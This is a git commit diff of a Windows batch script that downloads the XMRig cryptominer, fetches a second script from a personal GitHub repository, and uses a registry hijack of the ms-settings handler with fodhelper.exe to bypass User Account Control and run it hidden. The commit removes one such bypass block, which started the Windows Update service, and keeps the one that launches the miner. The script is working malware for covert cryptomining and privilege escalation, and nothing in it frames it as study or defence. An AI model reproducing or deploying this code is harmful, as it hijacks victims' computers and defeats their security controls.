636a82304fa1eb2f80d4abddcfe176c15d282145
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-05 06:13:10 -0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -2,11 +2,6 @@ powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/downl
 powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/restartado.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd"
 cls
-powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Start WUAUSERV""" -Force
-powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
-powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
-fodhelper.exe
-cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Start-Process C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd""" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
